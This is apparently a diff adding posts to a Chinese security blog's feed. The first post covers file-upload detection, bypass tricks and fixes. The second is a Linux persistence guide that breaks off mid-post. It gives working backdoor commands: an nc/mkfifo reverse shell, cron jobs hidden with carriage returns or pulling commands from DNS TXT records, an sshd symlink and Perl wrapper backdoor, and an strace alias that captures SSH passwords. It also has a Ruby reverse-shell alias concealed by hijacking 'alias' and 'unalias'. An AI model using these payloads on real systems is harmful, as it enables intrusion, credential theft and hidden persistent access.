+<h2 id="0x06-检测防御"><a href="#0x06-检测防御" class="headerlink" title="0x06 检测防御"></a>0x06 检测防御</h2><p>当一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据，针对文件上传过程检测校验措施如下</p>
+<h3 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1. 客户端校验"></a>1. 客户端校验</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过javascript来校验上传文件的后缀是否合法，可以采用白名单/黑名单的方式；在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2. 服务端校验"></a>2. 服务端校验</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 文件头content-type字段校验（image/gif）</span><br><span class="line"></span><br><span class="line">2) 文件内容头校验，通过正则匹配来判断文件幻数(文件头)内容是否符合要求，常见的文件头（文件头标志位）如下:</span><br><span class="line"></span><br><span class="line">  a) .JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00）</span><br><span class="line"></span><br><span class="line">  b）.gif，”GIF89A”（474946383961）</span><br><span class="line"></span><br><span class="line">  c）.zip，”ZipCompressed”（504B0304）</span><br><span class="line"></span><br><span class="line">  d）.doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE1</span><br><span class="line"></span><br><span class="line">3）目录路经检测（检测跟Path参数相关的内容）</span><br><span class="line"></span><br><span class="line">4）文件扩展名检测(检测跟文件extension 相关的内容)</span><br><span class="line"></span><br><span class="line">5）后缀名黑名单校验</span><br><span class="line"></span><br><span class="line">6）后缀名白名单校验</span><br><span class="line"></span><br><span class="line">7）自定义正则校验</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-WAF校验"><a href="#3-WAF校验" class="headerlink" title="3. WAF校验"></a>3. WAF校验</h3><p>使用不同的WAF产品来进行过滤，通常是独立于服务程序的一段中间程序或者硬件</p>
+<h2 id="0x07-绕过姿势"><a href="#0x07-绕过姿势" class="headerlink" title="0x07 绕过姿势"></a>0x07 绕过姿势</h2><h3 id="1-客户端绕过"><a href="#1-客户端绕过" class="headerlink" title="1. 客户端绕过"></a>1. 客户端绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 通过火狐插件NOscript插件或者禁用IE中JS脚本</span><br><span class="line"></span><br><span class="line">2. 通过firbug插件元素审核修改代码（如删除onsubm:t=”return checkFile()”事件）</span><br><span class="line"></span><br><span class="line">3. 通过firbug元素审核javascirpt脚本中添加上传文件类型</span><br><span class="line"></span><br><span class="line">4. 通过利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名，请求头中的Content-Length的值也要修改</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2. 服务端绕过"></a>2. 服务端绕过</h3><p>(1) 黑名单扩展名绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 利用黑名单未包含的扩展名进行绕过：如iis6.0中的asa 和cer，</span><br><span class="line"></span><br><span class="line">2) 黑名单特殊后缀名绕过：pht, phpt, phtml, php3,php4,php5,php6，需满足http.conf中设置AddTypeapplication/x-httpd-php .php1(php的版本小于等于5.3.29以下)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2）利用可能存在大小写绕过漏洞：如aSp(iis6.0中）和pHp（能在小于php5.3.39中的linux中）</span><br><span class="line"></span><br><span class="line">3）利用能被WEB容器解析的文件其他扩展名列表绕过</span><br><span class="line"></span><br><span class="line">  jsp,jspx ,jspfasp </span><br><span class="line"></span><br><span class="line">  asa cer cdx,htr,xml,html</span><br><span class="line"></span><br><span class="line">  aspx,ashx,asmx,asax,ascx</span><br></pre></td></tr></table></figure>
+
+<p>(2) 利用系统文件命名规则绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”不空格，利用此特性也可以绕过黑名单验证；apache中可以利用点结尾和空格绕过，asp和aspx中可以用空格绕过</span><br><span class="line"></span><br><span class="line">2）linux中当php版本小于php5.3.39，可用pHp大小写绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>(3) 服务端MIME文件类型(Content-Type)绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）MIME作用</span><br><span class="line"></span><br><span class="line">使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类，web客户端使用MIME来说明希望接收到的数据种类，它是服务器用来判断浏览器传递文件格式癿重要标记项</span><br><span class="line"></span><br><span class="line">2）常用文件上传类型的MIME表:</span><br><span class="line"></span><br><span class="line">  text/plain（纯文本）</span><br><span class="line">  text/html（HTML文档）</span><br><span class="line">  text/javascript（js代码）</span><br><span class="line">  application/xhtml+xml（XHTML文档）</span><br><span class="line">  image/gif（GIF图像）</span><br><span class="line">  image/jpeg（JPEG图像）</span><br><span class="line">  image/png（PNG图像）</span><br><span class="line">  video/mpeg（MPEG动画）</span><br><span class="line">  application/octet-stream（二进制数据）</span><br><span class="line">  application/pdf（PDF文档）</span><br><span class="line">  application/(编程语言) 该种语言的代码</span><br><span class="line">  application/msword（Microsoft Word文件）</span><br><span class="line">  message/rfc822（RFC 822形式）</span><br><span class="line">  multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</span><br><span class="line">  application/x-www-form-urlencoded（POST方法提交癿表单）multipart/form-data（POST提交时伴随文件上传的表单）</span><br><span class="line"></span><br><span class="line">3）绕过方法</span><br><span class="line"></span><br><span class="line">上传对文件类型做了限制，可通过burpsuit将其他类文件类型修改为如：Content-Type：image/gif和image/jpeg等运行的文件类型</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>(4) 利用文件包含漏洞绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 运行上传文件包含脚本木马和一句话木马</span><br><span class="line"></span><br><span class="line">  前提：校验规则只校验当文件后缀名为asp/php/jsp癿文件内容是否为木马</span><br><span class="line"></span><br><span class="line">  (a) 先上传一个内容为木马癿txt后缀文件，因为后缀名的关系没有检验内容；</span><br><span class="line"></span><br><span class="line">  (b) 然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt; </span><br><span class="line"></span><br><span class="line">  此时，这个php文件就会去引用txt文件的内容，从而绕过校验</span><br><span class="line"></span><br><span class="line">(2) 存在本地文件包含漏洞，并可上传一句话内容马</span><br><span class="line"></span><br><span class="line">  上传一个符合条件格式的文档，文档内容为一句话木马，利用文件包含漏洞包含上传癿木马文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-白名单绕过"><a href="#3-白名单绕过" class="headerlink" title="3. 白名单绕过"></a>3. 白名单绕过</h3><p>(1) 利用web服务器解析漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) nginx空字节漏洞</span><br><span class="line"></span><br><span class="line">xxx.jpg%00.php 这样的文件名会被解析为php代码运行</span><br><span class="line"></span><br><span class="line">2）apache解析漏洞</span><br><span class="line"></span><br><span class="line">上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别癿，因此就会直接将类型识别为php，从而达到注入php代码的目的</span><br></pre></td></tr></table></figure>
+
+<p>(2) .htaccess 文件重写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录访问、禁止目录列表、配置默认文档等功能</span><br><span class="line"></span><br><span class="line">配合黑名单列表绕过，上传一个自定义的.htaccess和一句话图片木马，可绕过各种检测</span><br></pre></td></tr></table></figure>
+
+<p>(3) 文件头检测绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件头过滤主要是通过验证图片的文件头的方式来判断是不是图片文件，针对这种情况，在要上传文件的文件头里面加上图片文件头即可绕过；如图片文件是否文件头含有gif89,可以通过一句话图片木马生成工具edjpgcom或者通过编辑器在木马内容基础上再加一些文件信息</span><br><span class="line"></span><br><span class="line">不同的图片文件都有不同文件头，如：</span><br><span class="line"></span><br><span class="line">  PNG：文件头标识(8 bytes) 89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">  JPEG：文件头标识(2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</span><br><span class="line">  GIF：文件头标识(6 bytes) 4749 46 38 39(37) 61</span><br></pre></td></tr></table></figure>
+
+<p>(4) CMS、编辑器漏洞绕过CMS漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">针对不同CMS存在的上传漏洞进行绕过</span><br><span class="line"></span><br><span class="line">编辑器漏洞：如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过</span><br></pre></td></tr></table></figure>
+
+<p>(5) 对渲染&#x2F;加载测试攻击内容检查绕过</p>
+<pre><code>通过向图片中加入代码注入，这里一般为一句话图片木马，可能正常访问图片
+</code></pre>
+<h3 id="4-WAF绕过"><a href="#4-WAF绕过" class="headerlink" title="4. WAF绕过"></a>4. WAF绕过</h3><p>(1) WAF检查的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名：解析文件名，判断是否在黑名单内</span><br><span class="line"></span><br><span class="line">文件内容：解析文件内容，判断是否为webshell</span><br><span class="line"></span><br><span class="line">文件目录权限</span><br><span class="line"></span><br><span class="line">请求的url</span><br><span class="line"></span><br><span class="line">Boundary边界</span><br><span class="line"></span><br><span class="line">MIME文件类型</span><br></pre></td></tr></table></figure>
+
+<p>(2) 绕过WAF方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 填充垃圾数据绕过</span><br><span class="line"></span><br><span class="line">有些主机WAF软件会对校验的用户数据设置大小上限，此种情况可以构造一个大文件，在木马内容前填充垃圾内容，可以绕过WAF对文件内容的校验; 可在Content-Type类型数据后添加垃圾数据，也可以将垃圾数据放在数据包最开头、绕过对文件名的校验</span><br><span class="line"></span><br><span class="line">2) POST/GET的更改方法绕过</span><br><span class="line"></span><br><span class="line">有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET</span><br><span class="line"></span><br><span class="line">3) 删除实体里面的Conten-Type字段绕过</span><br><span class="line"></span><br><span class="line">4) 删除Content-Disposition字段里的空格绕过</span><br><span class="line"></span><br><span class="line">5) 修改Content-Disposition字段值的大小写绕过  </span><br><span class="line"></span><br><span class="line">6) 文件扩展名出回车绕过（只支持php）</span><br><span class="line"></span><br><span class="line">7) 利用NTFS ADS特性绕过</span><br><span class="line"></span><br><span class="line">ADS是NTFS磁盘格式的一个特性，用亍NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过</span><br><span class="line"></span><br><span class="line">8) 文件重命名绕过</span><br><span class="line"></span><br><span class="line">如果web程序会将filename除了扩展名的那段重命名的话，可以构造更多的点、符号等绕过</span><br><span class="line"></span><br><span class="line">9) 特殊的长文件名绕过</span><br><span class="line"></span><br><span class="line">文件名使用非字母数字，比如中文等最大程度的拉长</span><br><span class="line"></span><br><span class="line">10) 引号去掉，双引号变单引号绕过</span><br><span class="line"></span><br><span class="line">11) 删除Content-Disposition值的form-data绕过</span><br><span class="line"></span><br><span class="line">12) 多个分号绕过</span><br><span class="line"></span><br><span class="line">当WAF遇到name=&quot;myfile&quot;;;时，认为没有解析到filename。而后端容器继续解析到的文件名是bk.php，导致WAF被绕过</span><br><span class="line"></span><br><span class="line">13) name和filename添加任意字符串(长度大于等于508）</span><br><span class="line"></span><br><span class="line">14) head头的content-type：tab绕过</span><br><span class="line"></span><br><span class="line">15) head头的content-type: multipart/form-data改成大写绕过</span><br><span class="line"></span><br><span class="line">16) head头的Content-Type: multipart/form-data;\n绕过</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-漏洞修复"><a href="#0x08-漏洞修复" class="headerlink" title="0x08 漏洞修复"></a>0x08 漏洞修复</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 将文件上传的目录设置为不可执行：只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响</span><br><span class="line"></span><br><span class="line">(3) 文件类型检查(白名单)</span><br><span class="line"></span><br><span class="line">在判断文件类型时，可以结合使用MIME Type、后缀检查等方式，在文件类型检查中，推荐白名单方式；此外对于图片的处理可使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码</span><br><span class="line"></span><br><span class="line">(4) 改写文件名和文件路径</span><br><span class="line"></span><br><span class="line">文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本</span><br><span class="line"></span><br><span class="line">(4) 本地文件上传限制被绕过：在服务器后端对上传的文件进行过滤</span><br><span class="line"></span><br><span class="line">(5) 单独设置文件服务器的域名</span><br><span class="line"></span><br><span class="line">由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript癿XSS利用等问题将得到解决</span><br><span class="line"></span><br><span class="line">(6) 开源编辑器上传漏洞</span><br><span class="line"></span><br><span class="line">更新编辑器版本,修复已知漏洞</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>漏洞研究</category>
+      </categories>
+      <tags>
+        <tag>Vulner</tag>
+        <tag>Execution</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>未授权漏洞总结</title>
     <url>/posts/51159/</url>
     <content><![CDATA[<center>各类未授权访问漏洞原理、利用方式总结...</center>
@@ -2095,6 +2095,86 @@ msf auxiliary(arp_sweep) &gt; run
       </tags>
   </entry>
   <entry>
+    <title>权限维持Linux后门篇</title>
+    <url>/posts/20809/</url>
+    <content><![CDATA[<center>本文记录Linux环境下权限维持思路及方法...</center>
+
+<span id="more"></span>
+<hr>
+<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br><span class="line"></span><br><span class="line">    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#x27;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.</span><br><span class="line">    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#x27;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.</span><br><span class="line">    cmd/unix/reverse_jjs                                Connect back and create a command shell via jjs</span><br><span class="line">    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#x27;t usually installed by default.</span><br><span class="line">    cmd/unix/reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd/unix/reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd/unix/reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd/unix/reverse_ssh                                Connect back and create a command shell via SSH</span><br><span class="line">    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh</span><br><span class="line">    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#x27;t usually installed by default</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line"></span><br><span class="line">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>
+
+<p>refer: <a href="https://gitee.com/l0n9/sec-notes/blob/master/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/Metsploit%E5%9F%BA%E7%A1%80%E7%AF%87.md">https://gitee.com/l0n9/sec-notes/blob/master/Metsploit</a></p>
+<h3 id="3-meterpreter-shell"><a href="#3-meterpreter-shell" class="headerlink" title="3. meterpreter shell"></a>3. meterpreter shell</h3><p>shell升级为 meterpreter shell</p>
+<p>攻击机配置msf 监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lport 6666</span><br><span class="line"></span><br><span class="line">set lhost 192.168.1.1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>目标主机上反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>获取一个普通shell, 在这个shell中输入 background, 在对话中选择 y, 将shell放在了后台</p>
+<p>使用 sessions -u 1 将普通shell提升为 meterpreter shell</p>
+<p>sessions命令查看shell会话，sessions -i id 切换到目标shell</p>
+<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) sudo find / -name &#x27;cron*&#x27; | egrep -v &#x27;man|doc&#x27; | sort -u</span><br><span class="line"></span><br><span class="line">2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#x27;doc|man&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 用户允许/禁止配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.deny ：用来禁止一些用户使用cron服务的配置文件</span><br><span class="line"></span><br><span class="line">- /etc/cron.allow ：允许一些用户来使用cron服务的配置文件，优先级高</span><br><span class="line"></span><br><span class="line">2) 系统配置项：系统执行的计划任务</span><br><span class="line"></span><br><span class="line">- /etc/crontab </span><br><span class="line"></span><br><span class="line">- /etc/cron.d/</span><br><span class="line"></span><br><span class="line">3) 用户配置项：执行crontab命令操作的目录</span><br><span class="line"></span><br><span class="line">- /var/spool/cron</span><br><span class="line"></span><br><span class="line">4) 其他计划任务文件</span><br><span class="line"></span><br><span class="line">    /etc/cron.daily</span><br><span class="line">    /etc/cron.deny</span><br><span class="line">    /etc/cron.hourly</span><br><span class="line">    /etc/cron.monthly</span><br><span class="line">    /etc/cron.weekly</span><br></pre></td></tr></table></figure>
+
+<p>定时任务在线生成器：<a href="https://crontab.guru/">https://crontab.guru/</a></p>
+<h3 id="3-计划任务隐藏后门"><a href="#3-计划任务隐藏后门" class="headerlink" title="3. 计划任务隐藏后门"></a>3. 计划任务隐藏后门</h3><p>隐藏思路</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容</span><br><span class="line"></span><br><span class="line">2) 不使用常用目录及文件如：/var/spool/cron、/etc/crontab等</span><br><span class="line"></span><br><span class="line">3) 劫持/修改系统默认的计划任务文件：伪装文件名/文件位置</span><br><span class="line"></span><br><span class="line">如：/etc/cron.daily 、/etc/cron.hourly目录下自带文件</span><br></pre></td></tr></table></figure>
+
+<p>隐藏技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /root/.devops.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line"></span><br><span class="line">2) 使用DNS的TXT记录，通过解析这个记录来进行执行，使用linux.org等公共域名进行隐藏</span><br><span class="line"></span><br><span class="line">0 1 * * * /bin/sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>refer：<a href="https://blog.sucuri.net/2019/05/cronjob-backdoors.html">https://blog.sucuri.net/2019/05/cronjob-backdoors.html</a></p>
+<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=6666;</span><br><span class="line"></span><br><span class="line">ssh root@x.x.x.x -p 6666</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line">vim sshd //编辑sshd内容为以下</span><br><span class="line"></span><br><span class="line">#!/usr/bin/perl</span><br><span class="line">exec&quot;/bin/sh&quot; if(getpeername(STDIN)=~/^..0V/); // \x00\x000V是22222的大端形式</span><br><span class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</span><br><span class="line"></span><br><span class="line">重启sshd</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">本机执行</span><br><span class="line">socat STDIO TCP4:127.0.0.1:22,sourceport=22222</span><br><span class="line"></span><br><span class="line">修改源端口</span><br><span class="line">import struct</span><br><span class="line">buffer = struct.pack(&#x27;&gt;I&#x27;,22222)</span><br><span class="line">print(buffer)</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-SSH公钥后门"><a href="#3-SSH公钥后门" class="headerlink" title="3. SSH公钥后门"></a>3. SSH公钥后门</h3><p>攻击机中使用 ssh-keygen -t rsa 生成公私钥</p>
+<p>将公钥 id_rsa.pub 上传到目标主机，保存为 ~&#x2F;.ssh&#x2F;authorized_keys</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh user@host</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read.write.connect -s 2048 ssh&#x27;</span><br><span class="line"></span><br><span class="line">grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-alias后门"><a href="#0x04-alias后门" class="headerlink" title="0x04 alias后门"></a>0x04 alias后门</h2><h3 id="1-后门存放位置"><a href="#1-后门存放位置" class="headerlink" title="1. 后门存放位置"></a>1. 后门存放位置</h3><p>系统启动默认加载的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) /etc/profile</span><br><span class="line"></span><br><span class="line">【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 /etc/profile</span><br><span class="line"></span><br><span class="line">2) /etc/bashrc</span><br><span class="line"></span><br><span class="line">【系统级】在 bash shell 打开时运行，修改该文件配置的环境变量将会影响所有用户使用的bash shell</span><br><span class="line"></span><br><span class="line">3) ~/.bashrc</span><br><span class="line"></span><br><span class="line">【用户级】当用户登录时以及每次打开新的shell时该文件都将被读取，不推荐在这里配置用户专用的环境变量，因为每开一个shell，该文件都会被读取一次</span><br><span class="line"></span><br><span class="line">4) ~/.bash_profile &amp;&amp; ~./bash_login</span><br><span class="line"></span><br><span class="line">【用户级】</span><br><span class="line"></span><br><span class="line">如果有其中的一个文件存在的话, 当启动的是一个登录shell时，Bash 会执行该文件而不会执行~/.profile </span><br><span class="line"></span><br><span class="line">如果两个文件都存在的话，Bash 将会优先执行~/.bash_profile 而不是~/.bash_login </span><br><span class="line"></span><br><span class="line">5) ~/.bash_logout</span><br><span class="line"></span><br><span class="line">【用户级】当每次退出系统(退出bash shell)时执行该文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-后门制作"><a href="#2-后门制作" class="headerlink" title="2. 后门制作"></a>2. 后门制作</h3><p>当前用户目录下.bashrc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias ssh=&#x27;strace -o /tmp/sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read,write,connect -s 2048 ssh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>创建alias后门</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 受控端创建别名</span><br><span class="line"></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;&#x27;&quot;&#x27;&quot;192.168.1.1&quot;&#x27;&quot;&#x27;&quot;,&quot;&#x27;&quot;&#x27;&quot;6666&quot;&#x27;&quot;&#x27;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#x27;&quot;&#x27;&quot;r&quot;&#x27;&quot;&#x27;&quot;)&#123;|io|c.print io.read&#125;end&#x27;;&#125;;alerts&quot;</span><br><span class="line"></span><br><span class="line">2）攻击端监听本地端口</span><br><span class="line"></span><br><span class="line">nc -lvnp 6666</span><br><span class="line"></span><br><span class="line">3) 受控端执行别名命令，攻击端获得反弹shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-后门隐藏"><a href="#3-后门隐藏" class="headerlink" title="3. 后门隐藏"></a>3. 后门隐藏</h3><p>alias命令可以查看当前的别名，会让别名后门暴露。因此需要劫持alias命令，使输出中不显示后门指令。</p>
+<p>另外unalias命令会清除别名，也需要对其进行劫持，避免后门指令的别名被清除。</p>
+<p><strong>1）创建unalias别名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2) 创建alias的别名</strong></p>
